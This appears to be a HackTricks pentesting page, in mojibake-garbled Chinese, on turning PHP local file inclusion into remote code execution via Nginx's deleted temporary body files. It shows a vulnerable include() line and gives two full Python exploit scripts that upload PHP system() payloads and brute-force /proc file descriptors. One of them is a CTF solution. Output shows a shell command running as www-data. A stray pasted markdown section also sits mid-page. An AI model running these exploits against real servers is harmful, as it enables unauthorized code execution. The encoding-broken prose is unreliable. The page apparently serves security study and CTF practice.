# LFI2RCE é€šè¿‡ Nginx ä¸´æ—¶æ–‡ä»¶

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF ç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ä»¬ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
## æ˜“å—æ”»å‡»çš„é…ç½®

* PHP ä»£ç ï¼š
```
<?php include_once($_GET['file']);
```
* FPM / PHP é…ç½®ï¼š
```
...
php_admin_value[session.upload_progress.enabled] = 0
php_admin_value[file_uploads] = 0
...
```
* è®¾ç½® / åŠ å›ºï¼š
```
...
chown -R 0:0 /tmp /var/tmp /var/lib/php/sessions
chmod -R 000 /tmp /var/tmp /var/lib/php/sessions
...
```
å¹¸è¿çš„æ˜¯ï¼ŒPHPç›®å‰é€šå¸¸é€šè¿‡PHP-FPMå’ŒNginxéƒ¨ç½²ã€‚Nginxæä¾›äº†ä¸€ä¸ªå®¹æ˜“è¢«å¿½è§†çš„[å®¢æˆ·ç«¯ä½“ç¼“å†²](https://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size)åŠŸèƒ½ï¼Œå¦‚æœå®¢æˆ·ç«¯ä½“ï¼ˆä¸é™äºpostï¼‰å¤§äºæŸä¸ªé˜ˆå€¼ï¼Œå®ƒå°†å†™å…¥ä¸´æ—¶æ–‡ä»¶ã€‚

å¦‚æœNginxä»¥ä¸PHPç›¸åŒçš„ç”¨æˆ·èº«ä»½è¿è¡Œï¼ˆé€šå¸¸ä½œä¸ºwww-dataï¼‰ï¼Œå³ä½¿æ²¡æœ‰å…¶ä»–åˆ›å»ºæ–‡ä»¶çš„æ–¹å¼ï¼Œè¿™ä¸ªåŠŸèƒ½ä¹Ÿå…è®¸åˆ©ç”¨LFIsã€‚

ç›¸å…³çš„Nginxä»£ç ï¼š
```c
ngx_fd_t
ngx_open_tempfile(u_char *name, ngx_uint_t persistent, ngx_uint_t access)
{
ngx_fd_t  fd;

fd = open((const char *) name, O_CREAT|O_EXCL|O_RDWR,
access ? access : 0600);

if (fd != -1 && !persistent) {
(void) unlink((const char *) name);
}

return fd;
}
```
å¯ä»¥çœ‹åˆ°ï¼Œ**tempfile åœ¨è¢« Nginx æ‰“å¼€åç«‹å³è¢«è§£é™¤é“¾æ¥**ã€‚å¹¸è¿çš„æ˜¯ï¼Œ**procfs å¯ä»¥é€šè¿‡ç«äº‰æ¡ä»¶ä»ç„¶è·å–åˆ°å·²åˆ é™¤æ–‡ä»¶çš„å¼•ç”¨**ï¼š
```
...
/proc/34/fd:
total 0
lrwx------ 1 www-data www-data 64 Dec 25 23:56 0 -> /dev/pts/0
lrwx------ 1 www-data www-data 64 Dec 25 23:56 1 -> /dev/pts/0
lrwx------ 1 www-data www-data 64 Dec 25 23:49 10 -> anon_inode:[eventfd]
lrwx------ 1 www-data www-data 64 Dec 25 23:49 11 -> socket:[27587]
lrwx------ 1 www-data www-data 64 Dec 25 23:49 12 -> socket:[27589]
lrwx------ 1 www-data www-data 64 Dec 25 23:56 13 -> socket:[44926]
lrwx------ 1 www-data www-data 64 Dec 25 23:57 14 -> socket:[44927]
lrwx------ 1 www-data www-data 64 Dec 25 23:58 15 -> /var/lib/nginx/body/0000001368 (deleted)
...
```
æ³¨æ„ï¼šåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä¸èƒ½ç›´æ¥åŒ…å« `/proc/34/fd/15`ï¼Œå› ä¸º PHP çš„ `include` å‡½æ•°ä¼šå°†è·¯å¾„è§£æä¸º `/var/lib/nginx/body/0000001368 (deleted)`ï¼Œè€Œè¿™åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­å¹¶ä¸å­˜åœ¨ã€‚å¹¸è¿çš„æ˜¯ï¼Œè¿™ä¸ªå°é™åˆ¶å¯ä»¥é€šè¿‡ä¸€äº›é—´æ¥æ–¹æ³•ç»•è¿‡ï¼Œæ¯”å¦‚ï¼š`/proc/self/fd/34/../../../34/fd/15`ï¼Œè¿™æœ€ç»ˆä¼šæ‰§è¡Œè¢«åˆ é™¤çš„ `/var/lib/nginx/body/0000001368` æ–‡ä»¶çš„å†…å®¹ã€‚

## å®Œæ•´åˆ©ç”¨
```python
#!/usr/bin/env python3
import sys, threading, requests

# exploit PHP local file inclusion (LFI) via nginx's client body buffering assistance
# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details

URL = f'http://{sys.argv[1]}:{sys.argv[2]}/'

# find nginx worker processes
r  = requests.get(URL, params={
'file': '/proc/cpuinfo'
})
cpus = r.text.count('processor')

r  = requests.get(URL, params={
'file': '/proc/sys/kernel/pid_max'
})
pid_max = int(r.text)
print(f'[*] cpus: {cpus}; pid_max: {pid_max}')

nginx_workers = []
for pid in range(pid_max):
r  = requests.get(URL, params={
'file': f'/proc/{pid}/cmdline'
})

if b'nginx: worker process' in r.content:
print(f'[*] nginx worker found: {pid}')

nginx_workers.append(pid)
if len(nginx_workers) >= cpus:
break

done = False

# upload a big client body to force nginx to create a /var/lib/nginx/body/$X
def uploader():
print('[+] starting uploader')
while not done:
requests.get(URL, data='<?php system($_GET["c"]); /*' + 16*1024*'A')

for _ in range(16):
t = threading.Thread(target=uploader)
t.start()

# brute force nginx's fds to include body files via procfs
# use ../../ to bypass include's readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`
def bruter(pid):
global done

while not done:
print(f'[+] brute loop restarted: {pid}')
for fd in range(4, 32):
f = f'/proc/self/fd/{pid}/../../../{pid}/fd/{fd}'
r  = requests.get(URL, params={
'file': f,
'c': f'id'
})
if r.text:
print(f'[!] {f}: {r.text}')
done = True
exit()

for pid in nginx_workers:
a = threading.Thread(target=bruter, args=(pid, ))
a.start()
```
```markdown
# LFI to RCE via Nginx Temporary Files

åœ¨æŸäº›é…ç½®ä¸‹ï¼ŒNginx ä¼šå°†å¤§çš„è¯·æ±‚ä½“å­˜å‚¨åœ¨ä¸´æ—¶æ–‡ä»¶ä¸­ã€‚å¦‚æœåº”ç”¨ç¨‹åºå­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰æ¼æ´ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨è¿™ä¸€ç‚¹æ¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ã€‚

## æ¼æ´åŸç†

å½“å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªå¤§çš„ POST è¯·æ±‚åˆ° Nginx æ—¶ï¼ŒNginx ä¼šå°†è¯·æ±‚ä½“å­˜å‚¨åœ¨ `/var/lib/nginx/body` ç›®å½•ä¸‹çš„ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ä¸­ã€‚å¦‚æœåº”ç”¨ç¨‹åºå…è®¸åŒ…å«æœ¬åœ°æ–‡ä»¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ LFI æ¼æ´åŒ…å«è¿™ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶åŒ…å«å¯æ‰§è¡Œçš„ PHP ä»£ç ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´ RCEã€‚

## åˆ©ç”¨æ­¥éª¤

1. å‘é€ä¸€ä¸ªå¤§çš„ POST è¯·æ±‚ï¼Œå…¶ä¸­åŒ…å« PHP ä»£ç ï¼Œåˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚
2. é€šè¿‡ LFI æ¼æ´æ‰¾åˆ°ä¸´æ—¶æ–‡ä»¶çš„è·¯å¾„ã€‚
3. åŒ…å«ä¸´æ—¶æ–‡ä»¶ä»¥æ‰§è¡Œ PHP ä»£ç ã€‚

## é˜²å¾¡æªæ–½

- ç¦æ­¢åº”ç”¨ç¨‹åºåŒ…å«ä¸å¿…è¦çš„æ–‡ä»¶ã€‚
- é™åˆ¶ Nginx ä¸´æ—¶æ–‡ä»¶çš„è¯»å–æƒé™ã€‚
- å®šæœŸæ¸…ç† `/var/lib/nginx/body` ç›®å½•ä¸‹çš„ä¸´æ—¶æ–‡ä»¶ã€‚

é€šè¿‡ç†è§£å’Œåˆ©ç”¨ Nginx çš„è¡Œä¸ºï¼Œæ”»å‡»è€…å¯ä»¥å°†ä¸€ä¸ªç®€å•çš„ LFI æ¼æ´å‡çº§ä¸º RCEã€‚é˜²å¾¡æªæ–½åº”è¯¥åŒ…æ‹¬é™åˆ¶æ–‡ä»¶åŒ…å«åŠŸèƒ½å’ŒåŠ å¼ºæœåŠ¡å™¨é…ç½®ã€‚
```
```
$ ./pwn.py 127.0.0.1 1337
[*] cpus: 2; pid_max: 32768
[*] nginx worker found: 33
[*] nginx worker found: 34
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] brute loop restarted: 33
[+] brute loop restarted: 34
[!] /proc/self/fd/34/../../../34/fd/9: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### å¦ä¸€ä¸ªæ¼æ´åˆ©ç”¨

è¿™æ¥è‡ª [https://lewin.co.il/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/](https://lewin.co.il/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/)
```python
import requests
import threading
import multiprocessing
import threading
import random

SERVER = "http://localhost:8088"
NGINX_PIDS_CACHE = set([34, 35, 36, 37, 38, 39, 40, 41])
# Set the following to True to use the above set of PIDs instead of scanning:
USE_NGINX_PIDS_CACHE = False

def create_requests_session():
session = requests.Session()
# Create a large HTTP connection pool to make HTTP requests as fast as possible without TCP handshake overhead
adapter = requests.adapters.HTTPAdapter(pool_connections=1000, pool_maxsize=10000)
session.mount('http://', adapter)
return session

def get_nginx_pids(requests_session):
if USE_NGINX_PIDS_CACHE:
return NGINX_PIDS_CACHE
nginx_pids = set()
# Scan up to PID 200
for i in range(1, 200):
cmdline = requests_session.get(SERVER + f"/?action=read&file=/proc/{i}/cmdline").text
if cmdline.startswith("nginx: worker process"):
nginx_pids.add(i)
return nginx_pids

def send_payload(requests_session, body_size=1024000):
try:
# The file path (/bla) doesn't need to exist - we simply need to upload a large body to Nginx and fail fast
payload = '<?php system("/readflag"); ?> //'
requests_session.post(SERVER + "/?action=read&file=/bla", data=(payload + ("a" * (body_size - len(payload)))))
except:
pass

def send_payload_worker(requests_session):
while True:
send_payload(requests_session)

def send_payload_multiprocess(requests_session):
# Use all CPUs to send the payload as request body for Nginx
for _ in range(multiprocessing.cpu_count()):
p = multiprocessing.Process(target=send_payload_worker, args=(requests_session,))
p.start()

def generate_random_path_prefix(nginx_pids):
# This method creates a path from random amount of ProcFS path components. A generated path will look like /proc/<nginx pid 1>/cwd/proc/<nginx pid 2>/root/proc/<nginx pid 3>/root
path = ""
component_num = random.randint(0, 10)
for _ in range(component_num):
pid = random.choice(nginx_pids)
if random.randint(0, 1) == 0:
path += f"/proc/{pid}/cwd"
else:
path += f"/proc/{pid}/root"
return path

def read_file(requests_session, nginx_pid, fd, nginx_pids):
nginx_pid_list = list(nginx_pids)
while True:
path = generate_random_path_prefix(nginx_pid_list)
path += f"/proc/{nginx_pid}/fd/{fd}"
try:
d = requests_session.get(SERVER + f"/?action=include&file={path}").text
except:
continue
# Flags are formatted as hxp{<flag>}
if "hxp" in d:
print("Found flag! ")
print(d)

def read_file_worker(requests_session, nginx_pid, nginx_pids):
# Scan Nginx FDs between 10 - 45 in a loop. Since files and sockets keep closing - it's very common for the request body FD to open within this range
for fd in range(10, 45):
thread = threading.Thread(target = read_file, args = (requests_session, nginx_pid, fd, nginx_pids))
thread.start()

def read_file_multiprocess(requests_session, nginx_pids):
for nginx_pid in nginx_pids:
p = multiprocessing.Process(target=read_file_worker, args=(requests_session, nginx_pid, nginx_pids))
p.start()

if __name__ == "__main__":
print('[DEBUG] Creating requests session')
requests_session = create_requests_session()
print('[DEBUG] Getting Nginx pids')
nginx_pids = get_nginx_pids(requests_session)
print(f'[DEBUG] Nginx pids: {nginx_pids}')
print('[DEBUG] Starting payload sending')
send_payload_multiprocess(requests_session)
print('[DEBUG] Starting fd readers')
read_file_multiprocess(requests_session, nginx_pids)
```
## å®éªŒå®¤

* [https://bierbaumer.net/security/php-lfi-with-nginx-assistance/php-lfi-with-nginx-assistance.tar.xz](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/php-lfi-with-nginx-assistance.tar.xz)
* [https://2021.ctf.link/internal/challenge/ed0208cd-f91a-4260-912f-97733e8990fd/](https://2021.ctf.link/internal/challenge/ed0208cd-f91a-4260-912f-97733e8990fd/)
* [https://2021.ctf.link/internal/challenge/a67e2921-e09a-4bfa-8e7e-11c51ac5ee32/](https://2021.ctf.link/internal/challenge/a67e2921-e09a-4bfa-8e7e-11c51ac5ee32/)

## å‚è€ƒèµ„æ–™

* [https://bierbaumer.net/security/php-lfi-with-nginx-assistance/](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWS hackingï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ä»¬ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥**åˆ†äº«æ‚¨çš„hackingæŠ€å·§ã€‚

</details>
